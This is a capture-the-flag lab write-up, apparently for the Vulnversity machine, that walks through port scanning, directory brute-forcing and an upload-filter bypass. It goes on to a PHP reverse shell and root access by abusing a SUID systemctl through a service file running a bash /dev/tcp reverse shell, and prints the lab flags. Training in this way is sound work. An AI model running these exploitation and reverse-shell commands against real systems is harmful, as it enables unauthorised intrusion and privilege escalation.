## Task 2 - Reconnaissance 
```
nmap -n -sV -p- 10.10.66.52 --min-rate 5000 -v -oN nmap

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-02 19:02 CDT
NSE: Loaded 46 scripts for scanning.
Initiating Ping Scan at 19:02
Scanning 10.10.66.52 [4 ports]
Completed Ping Scan at 19:02, 0.33s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 19:02
Scanning 10.10.66.52 [65535 ports]
Discovered open port 139/tcp on 10.10.66.52
Discovered open port 22/tcp on 10.10.66.52
Discovered open port 445/tcp on 10.10.66.52
Discovered open port 21/tcp on 10.10.66.52
Increasing send delay for 10.10.66.52 from 0 to 5 due to 1290 out of 4298 dropped probes since last increase.
Increasing send delay for 10.10.66.52 from 5 to 10 due to max_successful_tryno increase to 4
Increasing send delay for 10.10.66.52 from 10 to 20 due to max_successful_tryno increase to 5
Increasing send delay for 10.10.66.52 from 20 to 40 due to max_successful_tryno increase to 6
Increasing send delay for 10.10.66.52 from 40 to 80 due to 2638 out of 8792 dropped probes since last increase.
Increasing send delay for 10.10.66.52 from 80 to 160 due to 2278 out of 7592 dropped probes since last increase.
Increasing send delay for 10.10.66.52 from 160 to 320 due to 449 out of 1496 dropped probes since last increase.
Increasing send delay for 10.10.66.52 from 320 to 640 due to max_successful_tryno increase to 7
Increasing send delay for 10.10.66.52 from 640 to 1000 due to 1728 out of 5758 dropped probes since last increase.
Discovered open port 3128/tcp on 10.10.66.52
Discovered open port 3333/tcp on 10.10.66.52
Completed SYN Stealth Scan at 19:03, 24.62s elapsed (65535 total ports)
Initiating Service scan at 19:03
Scanning 6 services on 10.10.66.52
Completed Service scan at 19:03, 22.59s elapsed (6 services on 1 host)
NSE: Script scanning 10.10.66.52.
Initiating NSE at 19:03
Completed NSE at 19:03, 1.03s elapsed
Initiating NSE at 19:03
Completed NSE at 19:03, 0.83s elapsed
Nmap scan report for 10.10.66.52
Host is up (0.19s latency).
Not shown: 65529 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 49.66 seconds
           Raw packets sent: 119689 (5.266MB) | Rcvd: 107025 (4.281MB)
                                                                            
```

- There are many Nmap "cheatsheets" online that you can use too.

- Scan the box; how many ports are open?
6

- What version of the squid proxy is running on the machine?
3.5.12

- How many ports will Nmap scan if the flag **-p-400** was used?
400

- What is the most likely operating system this machine is running?
Ubuntu

- What is the flag for enabling verbose mode using Nmap?
-v

## Task 3 - Locating directories using Gobuster

- I have successfully configured Gobuster.

- What is the directory that has an upload form page?
/internal/

```
gobuster dir -u http://10.10.66.52:3333 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.66.52:3333
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 318] [--> http://10.10.66.52:3333/images/]
/css                  (Status: 301) [Size: 315] [--> http://10.10.66.52:3333/css/]
/js                   (Status: 301) [Size: 314] [--> http://10.10.66.52:3333/js/]
/fonts                (Status: 301) [Size: 317] [--> http://10.10.66.52:3333/fonts/]
/internal             (Status: 301) [Size: 320] [--> http://10.10.66.52:3333/internal/]
Progress: 10645 / 220561 (4.83%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 10665 / 220561 (4.84%)
===============================================================
Finished
===============================================================

```

## Task 4 - Compromise the Webserver

http://10.10.66.52:3333/internal/

- Upload functuonality

- Burp Intruder
```
-----------------------------113289850624095233473932801319
Content-Disposition: form-data; name="file"; filename="shell§.php§"
Content-Type: application/x-php

Payload settings (simple list)
php
php3
php4
php5
phtml
```

- Buscamos la posible carpeta donde se subio con gobuster

/uploads/

```
gobuster dir -u http://10.10.66.52:3333/internal/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.66.52:3333/internal/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 328] [--> http://10.10.66.52:3333/internal/uploads/]
Progress: 483 / 220561 (0.22%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 505 / 220561 (0.23%)
===============================================================
Finished
===============================================================

```

### Getting a Reverse Shell

- Invocamos el shell que se subio, debemos poner en escucha nuestra pc

```
http://10.10.66.52:3333/internal/uploads/shell.phtml


nc -lnvp 1234 
listening on [any] 1234 ...
connect to [10.2.4.107] from (UNKNOWN) [10.10.66.52] 43320
Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 21:01:31 up  1:14,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ which python3
/usr/bin/python3
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@vulnuniversity:/$ ^Z
zsh: suspended  nc -lnvp 1234
                                                                                                             
┌──(kali㉿kali)-[~/tryhackme/vulnversity]
└─$ stty raw -echo & fg     
[2] 41159
[1]  - continued  nc -lnvp 1234
[2]  + suspended (tty output)  stty raw -echo


www-data@vulnuniversity:/$ 

www-data@vulnuniversity:/$ export TERM=xterm
export TERM=xterm



www-data@vulnuniversity:/$ stty columns 83 rows 40

```


```
sudo apt install rlwrap

rlwrap nc -lnvp 1234](<lwrap nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.2.4.107] from (UNKNOWN) [10.10.66.52] 43340
Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 21:22:54 up  1:35,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ export TERM=xterm
$ls

www-data@vulnuniversity:/$ stty columns 83 rows 40
stty columns 83 rows 40
www-data@vulnuniversity:/$ 


```

- What common file type you'd want to upload to exploit the server is blocked? Try a couple to find out.
php

- I understand the Burpsuite tool and its purpose during pentesting.

- What extension is allowed after running the above exercise?
phtml

- While completing the above exercise, I have successfully downloaded the PHP reverse shell.

- What is the name of the user who manages the webserver?
bill

- What is the user flag?
```
www-data@vulnuniversity:/home/bill$ cat user.txt
cat user.txt
8bd7992fbe8a6ad22a63361004cfcedb
```

## Privilege Escalation

- Buscar SUIDS
```
www-data@vulnuniversity:/home/bill$ find / -user root -perm /4000 2>/dev/null
find / -user root -perm /4000 2>/dev/null
/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/squid/pinger
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/bin/su
/bin/ntfs-3g
/bin/mount
/bin/ping6
/bin/umount
/bin/systemctl
/bin/ping
/bin/fusermount
/sbin/mount.cifs
www-data@vulnuniversity:/home/bill$ 
```

- On the system, search for all SUID files. Which file stands out?
/bin/systemctl

- What is the root flag value?

https://gtfobins.github.io/

- crear un archivo especial root.service y lo trasnfiere


```
curl http://10.2.4.107/root.service -o root.service
```


```
cat root.service         
[Unit]
Description=roooooooooot

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.2.4.107/9999 0>&1'

[Install]
WantedBy=multi-user.target


python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.66.52 - - [02/Oct/2024 20:53:48] "GET /root.service HTTP/1.1" 200 -
10.10.66.52 - - [02/Oct/2024 20:54:00] "GET /root.service HTTP/1.1" 200 -

```


```
www-data@vulnuniversity:/dev/shm$ /bin/systemctl enable /dev/shm/root.service
/bin/systemctl enable /dev/shm/root.service
Created symlink from /etc/systemd/system/multi-user.target.wants/root.service to /dev/shm/root.service.
Created symlink from /etc/systemd/system/root.service to /dev/shm/root.service.
www-data@vulnuniversity:/dev/shm$ /bin/systemctl start root
/bin/systemctl start root
www-data@vulnuniversity:/dev/shm$ 

```

```
rlwrap nc -lnvp 9999                      
listening on [any] 9999 ...
connect to [10.2.4.107] from (UNKNOWN) [10.10.118.238] 41010
bash: cannot set terminal process group (1464): Inappropriate ioctl for device
bash: no job control in this shell
root@vulnuniversity:/# 

root@vulnuniversity:/# cd /root
cd /root
root@vulnuniversity:~# ls
ls
root.txt
root@vulnuniversity:~# cat root.txt
cat root.txt
a58ff8579f0a9270368d33a9966c7fd5
root@vulnuniversity:~# 



```
